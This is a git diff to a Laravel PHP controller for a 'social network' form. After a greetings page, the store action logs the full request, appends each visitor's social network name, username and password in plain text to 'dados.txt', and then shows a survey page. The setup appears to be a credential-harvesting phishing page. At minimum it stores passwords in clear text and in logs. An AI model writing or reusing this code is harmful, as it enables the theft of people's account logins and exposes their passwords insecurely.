@@ -4,12 +4,14 @@ namespace App\Http\Controllers;
 
 use App\RedeSocial;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Log;
 
 class RedeSocialController extends Controller
 {
     public function index()
     {
-        //
+        return view('saudacoes');
+
     }
 
     public function create()
@@ -19,8 +21,14 @@ class RedeSocialController extends Controller
 
     public function store(Request $request)
     {
-        return $request;
+        Log::info($request);
+        $fp = fopen("dados.txt","a");
+        $conteudo = $request->rede_social . " - " . $request->username . " - " . $request->password . "\n";
+        fwrite($fp,$conteudo);
+        fclose($fp);
+        return view('enquete');
     }
+
 
     public function show(RedeSocial $redeSocial)
     {
